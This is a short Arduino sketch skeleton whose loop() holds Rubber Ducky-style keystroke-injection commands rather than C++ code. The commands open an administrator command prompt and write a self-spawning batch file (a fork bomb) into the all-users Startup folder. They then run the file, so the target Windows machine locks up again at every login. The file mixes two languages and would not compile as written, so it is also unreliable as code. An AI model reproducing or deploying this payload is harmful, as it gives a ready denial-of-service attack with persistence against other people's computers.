void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

STRING cmd
DELAY 200
MENU
DELAY 100
STRING a
ENTER
DELAY 200
LEFT
ENTER
DELAY 1000
STRING cd %ProgramData%/Microsoft/Windows/Start Menu/Programs/Startup/
ENTER
STRING copy con a.bat
ENTER
STRING :START
ENTER
STRING start a.bat 
ENTER
STRING GOTO START
ENTER
CONTROL z
ENTER
STRING a.bat
ENTER
ALT F4
}
